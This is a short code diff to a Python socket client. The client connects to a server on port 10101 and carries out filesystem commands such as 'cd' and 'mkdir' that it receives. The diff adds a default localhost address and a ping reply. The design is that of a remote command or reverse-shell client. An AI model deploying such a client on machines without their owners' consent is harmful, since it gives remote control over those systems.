@@ -7,7 +7,7 @@ class Client(object):
     host = ""
     sckt = None
 
-    def __init__(self, host):
+    def __init__(self, host="127.0.0.1"):
         self.host = host
         self.sckt = socket.socket()
         self.sckt.connect((self.host, 10101))
@@ -17,7 +17,9 @@ class Client(object):
             data = self.sckt.recv(1024)
             # store decoded data as separate variable
             # check how to return to home directory with "cd"
-            if data[:2].decode("utf-8") == "cd":
+            if data.decode("utf-8") == "?":
+                self.sckt.send("!")
+            elif data[:2].decode("utf-8") == "cd":
                 os.chdir(data[3:].decode("utf-8"))
                 self.sckt.send(" ")
             elif data[:5].decode("utf-8") == "mkdir":
